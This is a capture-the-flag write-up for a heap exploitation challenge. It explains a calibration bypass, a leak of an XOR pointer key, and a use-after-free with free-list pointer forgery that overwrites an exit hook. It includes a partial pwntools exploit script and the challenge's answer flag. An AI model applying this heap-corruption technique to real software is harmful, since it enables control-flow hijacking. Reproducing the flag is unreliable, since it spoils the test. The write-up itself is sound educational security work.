---
title: "House of Mirror Reloaded"
ctf: "Kosovo Cyber CTF"
date: 2026-06-17
category: pwn
difficulty: hard
points: ~
flag_format: "KOS{...}"
author: "ylbadev"
---

# House of Mirror Reloaded

## Summary

A heap exploitation challenge with a custom arena allocator, XOR-encoded pointers (safe-linking style), and a calibration gadget. Two decoy flags are printed by the "silvering report" option. The real flag comes from overwriting an exit hook with `show_flag()` via a use-after-free + pointer forgery chain.

## Solution

### Step 1: Solve calibration

The server sends a `session nonce` and `calibration target`. The relation is:
`calibration_target = mix64(nonce XOR MAGIC) & 0xFFFF` where `MAGIC = 0xa51f00d5eed12345`.

Submit `cal_val = nonce XOR MAGIC` to pass calibration.

### Step 2: Leak the XOR encoding key

- `cast(slot=0, arena=0)` → allocates chunk0, stores pointer in `slots[0]`
- `reflect(slot=0)` → leaks `chunk0.next XOR key0` (encoded next pointer)
- Since chunk1's address is known (`ARENA0_BASE + 0x60`), recover `key0 = encoded ^ chunk1_addr`

### Step 3: UAF → fake free-list → exit hook overwrite

```python
from pwn import *
import re, sys

ARENA0_BASE  = 0x405040
ARENA0_CHUNK1 = ARENA0_BASE + 0x60
EXIT_HOOK    = 0x405758
SHOW_FLAG    = 0x401522
TARGET_PTR   = EXIT_HOOK - 8   # slots[2] write target
MAGIC        = 0xa51f00d5eed12345

def mix64(x):
    x &= 0xFFFFFFFFFFFFFFFF
    x ^= x >> 33; x = (x * 0xff51afd7ed558ccd) & 0xFFFFFFFFFFFFFFFF
    x ^= x >> 33; x = (x * 0xc4ceb9fe1a85ec53) & 0xFFFFFFFFFFFFFFFF
    x ^= x >> 33
    return x

r = remote('ctf.kosovacyber.team', 1341)
# ... parse nonce and target from banner ...

cal_val = nonce ^ MAGIC
# calibrate, cast, reflect, shatter, polish (UAF), cast x2, polish exit_hook
# leave() triggers exit_hook -> show_flag() -> prints /flag
```

The full exploit: cast slot0 → calibrate → reflect to get key0 → shatter slot0 (UAF) → polish slot0 to write `TARGET_PTR XOR key0` as fake next pointer → cast slot1 (pops chunk0) → cast slot2 (pops TARGET_PTR) → polish slot2 to write `show_flag` at `EXIT_HOOK` → leave triggers `show_flag()`.

The decoys `KOS{RELOADED_SILVERING_UNLOCK}` and `KOS{test_local_flag}` are printed by option 6 and the local test env respectively.

## Flag

```
KOS{BE36FA6A55B14D1ABF7BB1C79DFA2092}
```
